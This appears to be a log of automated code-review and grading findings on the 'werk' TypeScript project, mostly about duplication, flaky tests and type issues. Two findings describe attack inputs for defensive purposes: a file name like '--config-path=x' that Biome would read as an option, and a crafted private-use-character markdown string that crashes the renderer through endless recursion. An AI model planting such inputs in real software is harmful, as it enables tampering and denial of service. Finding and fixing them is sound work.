review.impact: `focusRef` keeps its `tabs` key but now holds a `Strip`. The handler destructures it as `tabs: now` and then reads `now.tabs.active`, so the name says one type and the value is another.
review.fix: Rename the key to `strip` (`useRef({ strip, focusAt })`) and destructure it as `strip`.

review.impact: The new park call copies the POST-with-token fetch boilerplate (`content-type` and `x-werk-token` headers, JSON body). This makes three copies in the file, at lines 77, 124 and 196.
review.fix: Add a `post(path, body)` helper next to `token()` and use it in all three places.

review.impact: `park` is the third identical fetch wrapper in `open()`, after `chat` and `tabs`. Only the route differs.
review.fix: Define `const post = (route: string) => (body: object, headers = { 'x-werk-token': token }) => fetch(...)` and build `chat`, `tabs` and `park` from it.

review.impact: The `alive(pid)` helper is copied again, here and in e2e/park.spec.ts:17. Four test files already have their own copy (scope, serve-board, run, serve-hot).
review.fix: Move `alive` into a shared test helper under src/test/ and import it, including from the e2e spec.

review.impact: `chatOf(page)` is just `parts(page).chat`. It exists only so tests can skip destructuring `chat`, which adds a second way to get the same locator.
review.fix: Destructure `chat` from `parts(page)` in the tests that need it, and delete `chatOf`.

review.impact: The resume-or-fork arguments are now a nested ternary over `session` and `parent`. That is harder to read than the single condition it replaced, and the comment above it only explains the fork case.
review.fix: Use an if/else, or a small `resumeArgs(record)` function with one comment per branch: resume its own session, fork the parent's, or start fresh.

review.impact: `msFromEnv` uses a generic key and an `as Partial<Record<K, number>>` cast, which is a type escape hatch, just so the result can be spread into the options.
review.fix: Make it return `number | undefined` and write `idleMs: msFromEnv('WERK_IDLE_MS')`. The options already default undefined values with `??` and destructuring defaults, so no cast is needed.

review.impact: In 'the idle check never kills a parked tab with a running turn', the tab is still parked and idle once t1 ends. With WERK_IDLE_MS=100 and a check every 25 ms, the child is killed if the SSE end event plus the t2 POST take more than about 100 ms. On a loaded CI machine that respawns the child, so `agentLaunches()` has length 2 and the test fails even though the code is correct.
review.fix: Widen the margin. Use an idle limit of about 400 ms and a slow step longer than that (for example `sleep: 1000`), so the running-turn check is still exercised and the gap between t1 ending and t2 being sent no longer races the sweep.

review.impact: The tab keys now index only the visible chips (`atPosition(chips(now), …)`, `stepped(chips(now), …)`), but no test has a parked tab while Cmd+N or Cmd+[ / Cmd+] is pressed. If this went back to indexing every tab, Cmd+1 would focus a parked tab and Cmd+] could step onto one, and no test would fail.
review.fix: In e2e/park.spec.ts, once a sixth tab has parked #werk, press Meta+1 and Meta+2 and assert that the selected chips are 'the map' and '#log'. Then press Meta+BracketRight from the last chip and assert that #werk stays parked.

review.impact: The resumed child replies 'One.', the same text as the first reply, so `transcript.getByRole('listitem').last()).toContainText('One.')` hardly separates a new reply from the old transcript. The check rests on the turn's listitem structure, not on the resumed child answering.
review.fix: Assert that the last listitem contains 'What was it?' and 'One.' together, or count listitems before and after the send and wait for the new item.

review.impact: The only end-to-end test of the park/un-park POSTs from ChatPane uses the close control. When the cap parks a tab, or a menu click un-parks one and parks another, the client's diff-based `useEffect` must send two requests, and nothing checks that the server receives them. If that effect broke, a parked tab's agent would never be stopped and nothing would show it.
review.fix: Under `werkEnv` with a short idle limit, give the main tab an agent, push it out with a sixth tab, and `expect.poll` until its pid is gone.

review.impact: Nothing tests that `msFromEnv` ignores invalid values ('0', '-5', 'abc', ''). If it took '0', `setInterval` would run with 0 ms and every parked child would be killed at once.
review.fix: Add a serve-chat test with WERK_IDLE_MS='0' or 'abc' that parks a tab, waits briefly, and asserts that the child is still alive.

review.impact: msFromEnv accepts any positive whole number, and nothing caps it. If WERK_IDLE_CHECK_MS is set above 2147483647 (about 24.8 days), Node and Bun treat the setInterval delay as 1 ms, so the idle sweep in src/chat/conversations.ts runs about every millisecond and wastes CPU. Only someone who controls the server's environment can set this, so the risk is low, but a value that looks like 'check very rarely' produces the opposite.
review.fix: In msFromEnv, refuse values above 2147483647 the same way it already refuses 0, or cap checkMs with Math.min(..., 2 ** 31 - 1) in startConversations. Also make sure checkMs never exceeds MAX_CHECK_MS when the variable is set.

grade.gap: Small extras with no direct ask: the '…' menu rows now carry the live state and get a yellow dot style (web/app.css `.all-tabs [data-state='waiting'] .dot`, tested in e2e/live.spec.ts 'its menu row says it waits'), and the '…' button title text names the other tab's state. Both are minor and support story 68, so they stay within tolerance.

review.impact: The idle sweep still reaps a parked tab when its only check is `convo.open.length > 0`. It ignores `record.background`. A parked tab whose turn has ended but whose background agent is still running gets SIGTERM once its stream has been quiet for `idleMs`, and that kills the background agent. Until then the tab reports itself as running. The new running state (#werk-mc-bgagents) and the reaper disagree about whether the child is busy.
review.fix: Have the sweep skip any child that is busy by the same rule `statusOf` uses. For example, add a shared `busy(tab, convo)` helper that checks `open.length > 0 || record.background > 0 || record.asks.length > 0`, and use it in both `statusOf` and the sweep.

review.impact: `answerOf(ask, true)` repeats the allow response that `allowAnswer` in src/build/overseer.ts already builds. If the control_response format changes, two copies must be kept in step. `live.ts` already depends on overseer.ts for `permissionAsk`, so the shared code is one import away.
review.fix: Build the allow branch with `allowAnswer(ask)`, or move both answer builders into one shared protocol module and import them from there.

review.impact: A chat module now imports the build overseer's stream parsing and re-exports it, and the web client imports `live.ts`. So the chat pane and the browser bundle now depend on `src/build`, and the overseer's file comment calls it the pure half of the build pass. The stream-JSON protocol helpers (`permissionAsk`, `PermissionAsk`, the answer) belong in neither area.
review.fix: Move `PermissionAsk`, `permissionAsk` and the answer builders into a neutral agent-protocol module, such as `src/agent/stream.ts`, and import that from both `overseer.ts` and `live.ts`. Drop the re-export from `live.ts`.

review.impact: `TabStrip` and `AllTabs` type `blink` as `Live | undefined`, but `moreBlink` only returns `'dead' | 'waiting' | undefined`. The wider prop type would accept 'running' or 'idle', which no CSS rule styles and which would produce a misleading title ('Another one is idle').
review.fix: Type `blink` as `ReturnType<typeof moreBlink>`, or export a `Blink = 'dead' | 'waiting'` type from `live.ts` and use it in both props.

review.impact: `answerOf` returns `object`, so neither the caller nor the tests can check the shape. The test has to cast the result to read `response.request_id`.
review.fix: Give `answerOf` a precise return type, such as a `ControlResponse` type, and drop the cast in `live.test.ts`.

review.impact: `liveOfTab` writes out `tabState(transcripts[id] ?? []) === 'running'` again, but the `running(of)` helper at line 44 already does exactly that. If the rule for 'a turn is running' changes, there are now two places to update.
review.fix: Write `liveOf(statuses[id], running(transcripts)(id))` so the existing helper is reused.

review.impact: The new `post` helper wraps the token-bearing JSON POST, but only AskBar uses it. The fetches to /api/tabs/park (line 96), /api/tabs (line 147) and /api/chat (line 225) still build the same headers and body by hand, so the file now has two ways of making the same request.
review.fix: Switch the park call to `post` at least, since it only cares whether the reply was ok. Or keep the helper local to AskBar until the other call sites move to it.

review.impact: `spawn` calls `recordOf(tab)` twice: once to destructure `parent` and `session`, and again as `record`. The duplicate lookup suggests these could be two different records, which they are not.
review.fix: Look the record up once at the top (`const record = recordOf(tab); const { parent, session } = record`) and use that everywhere in the function.

review.impact: The waiting yellow `#d4a106` and the `blink 0.8s steps(1) infinite` animation are each written out several times across the `.all-tabs`, `.tab` and `.tab-more` rules. Changing the colour or the blink timing means editing every copy.
review.fix: Group the selectors that share the animation into one rule (e.g. `.tab[data-state='waiting'] .dot, .tab[data-state='dead'] .dot, .tab-more[data-blink] { animation: ... }`), and do the same for the selectors that share the waiting colour.

review.impact: No test checks that a child werk stops on purpose (the idle reap of a parked tab, or close) leaves the tab un-dead. If the `stopped` flag were removed or never set, every reaped parked tab would show red and the '…' button would blink 'dead', and the existing reap test in e2e/park.spec.ts would still pass because it asserts nothing about data-state or data-blink.
review.fix: In the 'with an idle limit of milliseconds' test in e2e/park.spec.ts, after `alive(first)` becomes false, add `await expect(more).not.toHaveAttribute('data-blink')`. After un-parking, also check that the 'the map' chip's data-state is not 'dead' and that the 'dead conversations' list has count 0.

review.impact: None of the failure paths of POST /api/tabs/answer are tested: a missing or bad tab, request or allow (400), a request without the token (403), an unknown or already-answered ask (409), and a tab with no live child (where `chats.answer` returns false). A regression that let a second answer through, or let an answer reach another tab's child, would go unnoticed. The AskBar refusal UI is also never exercised.
review.fix: Add e2e cases that call the route with `page.request.post`: a request id that does not exist gives 409, the same ask answered twice gives 409 the second time, a body without the token gives 403, and `allow: 'yes'` gives 400. Check each status code and that the agent's inputs gain no extra control_response.

review.impact: Only 'Allow once' is tested end to end. The Deny button is never clicked, so a wrong `allow` flag from the Deny button or a broken deny payload on the wire (behavior 'deny', interrupt false) would pass. The unit test only checks answerOf in isolation.
review.fix: Add an e2e case or a step that clicks Deny on an ask. Assert that the fold agent's inputs contain `{behavior: 'deny', interrupt: false}` for that request_id, and that the ask bar goes away.

review.impact: The replay of non-idle tab statuses when /api/events connects is untested. If it broke, a reload during an open ask or a run would show the tab idle, with no ask bar and no blink, and no test would fail.
review.fix: In e2e/live.spec.ts, after `askInBackground`, call `page.reload()`, reopen or focus #fold as reload.spec does, and assert that the chip has data-state 'waiting' and that the ask bar shows 'ls -la'.

review.impact: No test checks that the dead state clears when the tab's next child starts. A regression that left a tab red forever after one crash would pass the crash test.
review.fix: At the end of the crash test, script another chat reply, send a message in #fold, and assert that the chip's data-state leaves 'dead' (it becomes 'running' and then 'idle').

review.impact: The `current` guard is untested. It stops an old child's late exit from wiping the asks and background count of a newer child of the same tab, or from marking that tab dead.
review.fix: Add a test (e2e with a reap followed by a quick un-park, or a unit test of startConversations with a fake agent) where the old child exits after the new one has started. Assert that the tab is not dead and keeps the new child's ask.

review.impact: The comment says the test proves the dot sits on the home card and not on the card the tab moved to. But the #fold tab never moves, and the check that tile('werk') has no data-live passes trivially, so the e2e test does not check home-card versus current-card placement. That is covered only by the runningCards unit test.
review.fix: Move the #fold tab to another card (for example 'werk') before clearing the hash, so that `tile('werk')` without data-live tests the home-card rule. Otherwise, reword the comment and drop the meaningless assertion.

review.impact: `deliver` calls `report(tab)` for every stdout line. With `--include-partial-messages` that means every streamed delta. Each call rebuilds the status and runs `JSON.stringify` on it just to check whether it changed. While an ask is open, that status includes the ask's full tool input, which can be large (for example the whole file body of a Write call). So any lines the child keeps sending while the ask is open, such as background agents' events, re-serialize that payload each time to find that nothing changed.
review.fix: Compare cheap fields instead of serializing the status: `running`, the first ask's `requestId` and `dead`. Store those as the dedup key. Or only call `report` when an event actually changed the turn count, asks, background count or death.

causeOfLast.why: the test downloaded packages from the network on each run and timed out on `main` too; the ticket's code was right, and I made the test use an app copy that links the installed packages.

grade.gap: Nothing clearly out of scope. Two small extras the next pass may trim if no story needs them: the '…' button's title text gains 'Another one is <state>' (web/src/ChatPane.tsx AllTabs title), and the main tab, which has no home card, puts its running dot on the card it has open now (src/chat/live.ts runningCards). The cli.test.ts change is test plumbing only and adds no behaviour.

review.impact: Background agents now count as running (record.background > 0), but the idle sweep still only checks convo.open.length. A parked tab whose turn has ended while a background agent runs gets reaped after idleMs. Its helper is killed without notice: stop() sets stopped=true, so the tab shows idle rather than dead. That contradicts the 'running' status the same module reports for that tab.
review.fix: Base the sweep's skip on the same notion of running that statusOf uses. For example, skip when `statusOf(tab).running || record.asks.length > 0`, or pull out a shared `busy(tab)` helper that both the sweep and statusOf use.

review.impact: The chat module and the web client (ChatPane imports live.ts) now depend on build/overseer.ts, the build-pass overseer, just to get the ask type and parser. live.ts re-exports them, so the stream-protocol knowledge for asks is split: overseer.ts parses control requests, and live.ts writes control responses in answerOf. A change to the overseer's ask shape would silently change the chat UI contract.
review.fix: Move PermissionAsk, permissionAsk and answerOf into a small shared protocol module (for example src/agent/control.ts), and have both overseer.ts and live.ts import from it instead of chat re-exporting from build.

review.impact: statusOf goes through recordOf, which creates and stores a TabRecord for any unknown tab. Reading a status therefore mutates the tab table: a status query or report for a tab that was never opened leaves an empty record behind, and statuses() and open() will then see it.
review.fix: In statusOf, use `tabs.get(tab)` and treat a missing record as IDLE. Keep record creation in the write paths (send/open).

review.impact: The change adds a `post` helper that sends a JSON POST with the werk token, but only AskBar uses it. The three existing fetch calls (`/api/tabs/park` at line 96, `/api/tabs` at line 147 and `/api/chat` at line 225) still build the same method, headers and body by hand. There are now two ways to do the same thing, and a future change to the token header or content type has to be made in four places.
review.fix: Move the existing park, open-tab and chat POSTs onto `post`. If one of them needs the raw Response (for example `/api/tabs` reads the JSON reply), give `post` a variant that returns the Response. Otherwise inline the call in AskBar and don't add a helper used only once.

review.impact: The tab state now has two sources. `running` (used by `inStrip`) still reads only the transcripts, while chips, the … button and the map use `liveOfTab`, which also reads server statuses. A reader can't tell which notion of 'running' decides strip eviction, and the two can drift apart. For example, a tab that is busy only because of a background agent counts as running for the map but not for the strip.
review.fix: Derive the strip predicate from `liveOf` as well (`(id) => liveOfTab(id) !== 'idle'` or `=== 'running'`). If the difference is on purpose, add a comment saying why the strip ignores server status.

review.impact: `blink` is typed `Live | undefined` in TabStrip and AllTabs, but `moreBlink` only returns `'dead' | 'waiting' | undefined`. The wider type allows values like 'idle' or 'running' that would put a meaningless `data-blink` attribute on the button and produce a title like 'Another one is idle'.
review.fix: Export a `Blink = 'dead' | 'waiting'` type (or `ReturnType<typeof moreBlink>`) from live.ts and use it for the `blink` props.

review.impact: `spawn` calls `recordOf(tab)` twice: once to destructure `parent`/`session` at the top and again for `record`. It's redundant and makes it look like the two could be different records.
review.fix: Call it once at the top, `const record = recordOf(tab); const { parent, session } = record`, and reuse `record`.

review.impact: The colour `#d4a106` and the declaration `animation: blink 0.8s steps(1) infinite` are each copied into several rules (waiting dot, dead dot, both `.tab-more` blinks). Changing the waiting colour or the blink rhythm means editing several places that have to stay in sync.
review.fix: Group the selectors: one rule for `.tab[data-state='waiting'] .dot, .tab[data-state='dead'] .dot, .tab-more[data-blink]` with the shared animation, and one for `.all-tabs [data-state='waiting'] .dot, .tab[data-state='waiting'] .dot` with the shared background. Or use a CSS custom property for the colour.

review.impact: Three tests repeat `const gate = join(werk.dir, '..', 'ask-now')` and pass it into `askInBackground`, and nothing else uses it. That's noise at every call site.
review.fix: Build the gate path inside `askInBackground`, or add a small `signal(werk, name)` helper for the gate, done and crash files.

review.impact: Nothing tests the `stopped` flag. That flag keeps a child werk stopped on purpose (a reaped parked tab, or close()) from being marked dead. If it broke or were removed, every reaped parked tab would turn red and make the … button blink, and the reap test in e2e/park.spec.ts would still pass because it never checks the tab's live state after the reap.
review.fix: In the park/reap e2e test (WERK_IDLE_MS=200), after the reap, assert that the parked tab's menu row has no data-state='dead', that the … button has no data-blink, and that no 'dead conversations' list appears.

review.impact: The deny path is never run end to end. The e2e tests only click 'Allow once', and the unit test only checks answerOf(ask,false). Nothing confirms that Deny sends a deny control_response to the right child, or that the turn goes on afterwards. The refusals of /api/tabs/answer (403 without the token, 400 for a bad body, 409 for an unknown or already-answered request) are not tested either, so a regression that answers an ask twice or accepts an answer without the token would go unnoticed.
review.fix: Add an e2e case that clicks Deny and asserts the fold run's inputs contain {behavior:'deny', interrupt:false} for r1 and the turn ends. Add request-level checks that POST /api/tabs/answer with no token gives 403, with allow missing gives 400, and a second answer to r1 gives 409.

review.impact: Nothing tests the replay of each non-idle tab's status when a client connects to /api/events. A page reload or a dropped SSE connection while a tab waits on an ask would lose the yellow marker and the ask bar, and no test would fail.
review.fix: In live.spec.ts, after the ask reaches the waiting state, call page.reload(), restore the strip if needed, and assert that chip('#fold') has data-state='waiting' and the ask bar shows on that tab.

review.impact: The comment says the dot sits on the home card and 'not on the card it moved to', but the tab never moves to another card. Clearing the hash leaves no current card, so the home-card rule is not actually checked. A version that used the current card for non-main tabs would still pass.
review.fix: Before checking the tree, move the #fold tab to another card (for example navigate to #log while #fold is active), then go to the whole map. Assert tile('fold') has data-live and tile('log') does not.

review.impact: Two paths in the ask queue are untested. One is several asks open at once: the first is reported, and answering it shows the next. The other is the `current` guard at line 207, which stops a superseded child's exit from wiping the asks and background count of the tab's newer child. Breaking either would go unnoticed.
review.fix: Add an e2e or fake-agent case with two asks (r1, r2): answer r1, then assert the ask bar shows r2 and the tab still waits. Also check that after a crash and a new message, the tab is no longer dead and its new state is reported.

grade.gap: Not run here: shell commands needed approval. From reading the code, the four targets should pass: the tests cover only scripts/, pure-files.txt lists scripts/coverage.ts and scripts/coverage.test.ts sits beside it, and tsconfig includes playwright.config.ts with @playwright/test installed.

Makefile: the `dev` and `build` targets (package.json scripts `bun --hot src/cli.ts serve` and `bun build --compile src/cli.ts`) point at src/cli.ts, which this diff does not create, so both targets fail today. No criterion or story 111/114/115 asks for a dev server or an executable build. Either remove these two targets and their scripts, or leave them to the tickets that build the server and the distribution. README 'Start: make dev' and AGENTS.md 'make dev starts werk' describe the same missing behaviour.
The dev script runs `werk serve` under `bun --hot`, as the card says. The entry file src/cli.ts does not exist yet (see scope-line).
The build script compiles src/cli.ts into one executable, which matches the card, but the file does not exist yet (see scope-line).

review.impact: `judge` checks for a missing coverage record before it checks `testsFailed`. If the own test file crashes before it imports the pure file (for example, a syntax error or a failing top-level import), the verdict reads "<test> never loads it" instead of "<test> fails". That points the person at the wrong cause.
review.fix: Check `input.testsFailed` before `input.record === undefined`. Return the "fails" reason with `percent` set to `input.record ? lineCoverage(input.record) : 0`.

review.impact: The lcov record is looked up with the exact text of the list entry. An entry written as `./src/a.ts`, or with any other spelling of the same path, never matches the `SF:` path that Bun writes. The file then fails with a misleading "never loads it".
review.fix: Normalize each entry in `parsePureList` with `path.normalize`, or in the gate before the lookup, so `./x.ts` and `x.ts` match. Normalize the `SF:` keys in `parseLcov` the same way.

review.impact: Malformed stdin makes the top-level `JSON.parse` throw. The hook then exits with code 1 and prints a stack trace instead of exiting quietly, which differs from how it handles every other unexpected input.
review.fix: Put the parse in a try/catch and `process.exit(0)` on a parse error, matching the hook's other early exits.

review.impact: The per-test time limit `--timeout=15000` is written twice: here and in the `test` script in package.json (line 12). If someone changes the limit in package.json for #werk-test-runner-parallel, the coverage gate keeps the old value. A test could then pass under `make test` and time out under `make test-coverage`, or the other way round.
review.fix: Keep the limit in one place. For example, set the timeout in bunfig.toml (`[test] timeout = 15000`) so that both `bun test` runs read it, and remove the flag from both command lines.

review.impact: The `project()` helper and its `afterEach` cleanup are nearly the same as the ones in scripts/coverage-gate.test.ts (line 15). Each new script test will copy them again, and a fix to the temp-folder handling for #werk-test-store has to be made in every copy.
review.fix: Move a `tempProject(prefix, files)` helper with its registered cleanup into a shared test-support module under scripts/, and use it from both test files. The hook test can add its `git init` and biome.json copy on top.

review.impact: `testsFailed` is the only optional field in judge's input; every other field is required. A caller that leaves it out gets 'tests passed' with no type error, which makes the gate easy to misuse. The test cases rely on leaving it out.
review.fix: Make `testsFailed: boolean` required, like `executable` and `hasOwnTest`, and add `testsFailed: false` to the shared `base` in coverage.test.ts.

review.impact: The test named 'does not count lines that another file's test runs' does not check that behaviour. sign.ts has no own test file, so judge() fails it at the hasOwnTest branch before any coverage is read. Suppose the gate were changed to run every test in one coverage pass and give each file the merged lcov line. This test would still pass. So nothing guards #werk-reflink-own-test-coverage end to end.
review.fix: Give sign.ts its own sign.test.ts that covers only some lines, for example halfTest. Keep caller.test.ts, which runs every line of sign.ts. Then assert that the output matches /FAIL\s+\d+\.\d\d%\s+sign\.ts/ with no 'missing own test file' reason, and that the exit code is 1.

review.impact: The assertion `toContain("gone.ts")` is met by any line that formatResult prints for the file, including an 'ok' line. So it does not check that the missing file is reported as missing. Only the exit-code assertion carries this test.
review.fix: Assert the full line: expect(out).toContain("FAIL    0.00%  gone.ts  (listed in pure-files.txt, but the file does not exist)").

review.impact: The under-threshold test accepts any FAIL percentage. A failure for another reason, such as a wrong lcov path that leads to 'never loads it' at 0.00%, would also pass, so the test does not show that the gate read the real coverage below 90%.
review.fix: Assert the exact percentage that halfTest gives (for example 'FAIL   60.00%  sign.ts' after checking the real lcov output), or at least check that the line has no '(' reason suffix.

review.impact: No test covers the tsx branch of hasExecutableLines. No test covers a list entry written as './x.ts', which will not match the lcov SF path and so is reported as 'never loads it'.
review.fix: Add a gate test with a listed .tsx pure file, and a gate test or parsePureList test that normalises or rejects a './'-prefixed path.

review.impact: The edited file's relative path goes straight into Biome's arguments. If a file's name starts with '-', for example '--config-path=x', Biome reads it as an option instead of a file. That can change which configuration Biome uses, or make Biome skip the file. There is no shell, so this cannot run commands. The file must also exist inside the project, so the risk is small.
review.fix: Put '--' before `inside` in the argument list, or pass `./${inside}` the way coverage-gate.ts passes `./${testFile}`. Either way Biome always reads the path as a file.

review.impact: `files.map(check)` runs each listed pure file's own test one at a time. Each one starts a new `bun test --coverage` process with `Bun.spawnSync`. The check's time grows with the full length of pure-files.txt, and the cores sit idle. #werk-test-scope-src0-pure-scope means that list will keep growing, so `make test-coverage` and `make check` will get slower with every pure file added.
review.fix: Start the runs with async `Bun.spawn` and gather them with `Promise.all`. Cap how many run at once (for example at `navigator.hardwareConcurrency` or 4, to match `--parallel=4`). Each run already has its own temporary coverage folder, so the runs don't share any state.

grade.gap: src/verbs/version.ts adds a `werk version` verb that prints the package version. src/verbs/index.ts imports it, and src/cli.test.ts tests it in 'werk version prints the version of the package'. No acceptance criterion asks for a version verb. Neither do stories 17, 18 or 19: story 17 is about verbs that write to the map, and criterion-2's second verb is already the test fixture src/cli/fixtures/echo-verb.ts. Remove src/verbs/version.ts, its import in src/verbs/index.ts, the version test, and the `version` assertions in src/cli.test.ts. The help test can check for `help` alone or use the echo fixture.

causeOfLast.why: the ticket offered `version` as an example of the trivial verb to ship, but the grader scored that verb as work outside the acceptance criteria and stories.

review.impact: The help verb lists the verbs in the module-level `registry` singleton, not the registry that `runVerb`/`start` was given. The unknown-verb path in `start.ts` uses the registry it was passed, so the same command line has two sources of truth. If `start` runs with any other `Registry`, `werk help` lists the wrong verbs while the usage error lists the right ones. It also means a verb can only reach the registry through a global, which works against the dependency injection that `start`/`runVerb` set up.
review.fix: Give verbs the registry they ran from, for example by adding it to the context passed to `run` (`run(args, io, verbs)`) or by having `runVerb` handle `help` itself through `formatHelp(verbs.list())`. Then `verbs/help.ts` no longer imports the singleton.

review.impact: The test registers the `echo` fixture into the process-wide `registry` singleton, and `registry.test.ts` does the same with `registry-test-verb`. Tests that share a process therefore leak verbs into each other. If this test runs twice in one process (rerun-each, watch mode), `register` throws 'registered twice' and the `not.toContain("echo")` assertion fails. This goes against the per-test isolation the project asks for (#werk-test-store spirit).
review.fix: Build a fresh `Registry` in the test and have the fixture export its verb (or a `register(registry)` function) instead of registering it at import time. Alternatively, give `Registry` an `unregister` and clean up in `afterEach`.

review.impact: When a flag is repeated, the last value silently replaces the earlier ones (`--parent a --parent b` gives `b`). The parser refuses every other malformed input with a reason, so this one accepted mistake is inconsistent and can hide a user error.
review.fix: Return `{ ok: false, error: `--${name} is given twice` }` when `name` is already in `flags`, unless repeatable flags are added on purpose later.

review.impact: `void runVerb(...).then(exit)` has no rejection handler. If anything outside the verb's try block throws (`io.err`, `formatHelp`, `parseArgs`, or `exit` itself), the result is an unhandled rejection. The exit callback never runs, and the exit code depends on how the runtime treats unhandled rejections rather than on werk.
review.fix: Add a final handler, for example `.then(exit, (error) => { io.err(`werk: ${String(error)}\n`); exit(1); })`.

review.impact: The test imports the echo-verb fixture, which registers `echo` into the shared command-line registry for the rest of the test process. `registry.test.ts:28` does the same with `registry-test-verb`. Because of this, the result depends on the order and number of runs: the check `before` not containing `echo` holds only on the first import, and running a file twice in one process (for example with `--rerun-each`) throws `registered twice`. This works against #werk-test-store's rule that each test gets its own state.
review.fix: Test that a verb module joins the help in a child process, as `cli.test.ts` already does with `slow-entry.ts`. For `registerVerb`, check that it delegates without leaving a verb behind, for example by spying on `registry.register`. Leave the global `registry` unmodified in unit tests.

review.impact: `argv[i] as string` is a type assertion that hides the `noUncheckedIndexedAccess` check. If someone later edits the loop bounds, the compiler will not catch it.
review.fix: Narrow without the cast, for example `const arg = argv[i]; if (arg === undefined) break;`. Or iterate with an explicit cursor that you read through a checked helper.

review.impact: The flags record type `Record<string, string | true>` is written out again here as well as in `VerbArgs`, so the two copies can drift apart.
review.fix: Declare it as `const flags: VerbArgs["flags"] = {};`.

review.impact: Usage errors have a named constant, `USAGE_ERROR`, but the exit code for a failed verb is a bare `1`. The set of exit codes is therefore only partly documented in one place.
review.fix: Add `export const VERB_FAILED = 1` with a doc comment next to `USAGE_ERROR`, and use it here and in `start.test.ts`.

review.impact: The process-backed `Io` object (stdout/stderr writers) is copied from `src/cli.ts:10`, so a change to how output is written has to be made twice.
review.fix: Export a `processIo` from `src/cli/start.ts`, or from a small `src/cli/io.ts`, and use it in both `cli.ts` and the fixture.

review.impact: This test changes the command line's shared `registry`. It loads the `echo-verb` fixture, which registers a verb as soon as it loads, and it asserts that `echo` is not registered yet. `registry.test.ts:28` does the same thing with `registry-test-verb`. Both depend on the test running once, in a fresh process. A second run in the same process fails: `--rerun-each` or watch mode, or another file that loads the fixture first. In `registry.test.ts`, the second `registerVerb` throws 'registered twice'. The order and process sharing of the parallel workers then decide whether these tests pass.
review.fix: Build a fresh `Registry` in the test. To exercise 'a module registers itself', make the fixture export a function that registers into a registry the test passes in, or spawn a child process the way `cli.test.ts` does. In `registry.test.ts`, give the verb a unique name on each run or remove it in a cleanup step, so neither test changes the process-wide registry.

review.impact: No test covers an empty value given with `=`. `--parent=` and `--parent=#` are accepted and both give the id "". A future check that refuses empty ids, or a regression that turns `--parent=` into 'needs a value', would go unnoticed.
review.fix: Add assertions for `parseArgs(link, ["a","b","--parent="])` and for `--parent=#`, so whatever the code decides for these cases stays fixed.

review.impact: No test covers a repeated flag, such as `--why x --why y`. The last value silently wins, and a change to that would not be caught.
review.fix: Add one assertion for a repeated flag, either that the last value wins or that it is refused, whichever is intended.

review.impact: The test for a wrong argument checks only the start of stderr. If the hint line 'Run werk help to see its arguments and flags.' were removed or changed, no test would fail.
review.fix: Assert the whole stderr with `toBe("werk show: show needs <id>\nRun werk help to see its arguments and flags.\n")`.

review.impact: The `formatHelp` test uses only `toStartWith` and `toContain`. It does not check that verbs are separated by a blank line, that their order is kept, or that the text ends with a newline. A regression in the layout would pass.
review.fix: Assert the exact `formatHelp([add, version])` output with `toBe`, as the `formatVerb` tests already do.

review.impact: Every card id from the command line goes through read() and cardId(), but they only strip one leading '#'. They accept '' (from '' or '#'), ids with '/', '..' or control characters, and ids that start with '-'. No verb uses an id yet, so nothing is exploitable today. But this is the one place where every card id enters the program, and a later verb that turns an id into a file path or a git ref will get unchecked input such as '../../x' unless it checks again.
review.fix: Check the id in read() for kind 'id' after cardId(): refuse an empty id, and refuse any id that does not match the card id grammar (for example /^[a-z0-9][a-z0-9-]*$/ or the map's own rule). Return a Parsed error like '<id> is not a card id', and add tests for '#', '', '../x' and 'a/b'.

grade.gap: Each of web/escape.ts, web/highlight.ts, web/md.ts and web/reflink.ts has its own test file and is listed in pure-files.txt. The tests appear to cover every line, but I could not run `make test-coverage` in this headless session because it needs approval. So the coverage gate's actual result is not checked.

These behaviours go beyond what the criteria and user stories ask for. (1) web/md.ts `renderTileInline` and web/reflink.ts `refLabel` render references inside grid tiles. #werk-reflink leaves the tile summary out of where references render, and no criterion asks for this. Remove both unless #werk-reflink-label asks for them. (2) web/md.ts renders a fence that has no closing line while a reply streams (test 'renders a fence with no closing line while text streams'). No criterion asks for streaming. (3) The full Markdown block and inline set in web/md.ts, meaning lists with a start number, block quotes, strikethrough and images, is more than the ticket's stories need. It is acceptable as the host renderer that references and fences sit in, so it passes.

review.impact: The inline renderer uses the private-use characters U+E000 and U+E001 to mark placeholders. escapeHtml does not escape them, so they can come in from card text or a chat reply. If a code span holds the text U+E000 0 U+E001, stash[0] ends up holding its own placeholder, and restore() (line 189) calls itself forever and throws a RangeError, so the whole card or message fails to render. If the marker appears in prose outside a code span, it is silently replaced by an unrelated stashed piece of HTML, or removed. I could not run this here because running code needed approval; it follows from reading inline() and restore().
review.fix: Keep user text from forming a placeholder. Either remove or escape U+E000 and U+E001 at the start of inline(), for example `escaped.replace(/[\uE000\uE001]/g, "")`, or replace them with numeric entities in escapeHtml. You could also make restore() substitute each stash entry only once instead of recursing without limit.

review.impact: ENTITIES is exported, but only escapeHtml and entityCharAtEnd in the same file use it. Exporting it widens the module's surface, and any caller could come to depend on the table instead of the two functions.
review.fix: Stop exporting ENTITIES and keep it private to escape.ts.

review.impact: `.tok-key` sets the same colour (#0550ae) as the `.tok-num, .tok-lit` rule right below it. Changing one of the copies later will quietly split the token colours.
review.fix: Merge the rules into one selector: `.tok-key, .tok-num, .tok-lit { color: #0550ae; }`.

review.impact: The `.ref code` styles are split between the shared font-family rule at the top and a separate `.ref code` font-size rule at the bottom. Anyone editing how references look has to find both places.
review.fix: Put all the `.ref code` declarations in one rule, or keep the shared font-family selector and move the font-size rule next to it.

review.impact: The JSON `key` pattern repeats the double-quoted string body from STRING_DQ, so a fix to string escaping has to be made in two places.
review.fix: Build both patterns from one shared source string, for example `const DQ_BODY = String.raw`"(?:\\.|[^"\\\n])*"``, and use it in both RegExps.

review.impact: `item[item.length - 1]` depends on BULLET having one capture group and NUMBERED having two, with the text always in the last group. Adding a group to either regex would silently pick the wrong text.
review.fix: Use a named group, e.g. `(?<text>.*)` in both regexes, and read `item.groups?.text`.

review.impact: `ENTITIES` is exported, but nothing outside escape.ts uses it. That widens the module's public surface without need.
review.fix: Remove the `export` so the table stays private to escape.ts.

review.impact: No test covers card text that already contains the private-use placeholder characters U+E000/U+E001. Such text breaks the renderer. Take `[\uE0000\uE001](/x)`: the label is stashed at index 0 and holds the placeholder for index 0. `restore` then recurses forever and throws a RangeError, so one crafted card, note or chat message stops that render. A literal `\uE0000\uE001` next to a code span also gets replaced by stashed HTML that the author never wrote. The suite passes either way, so nothing guards this failure path.
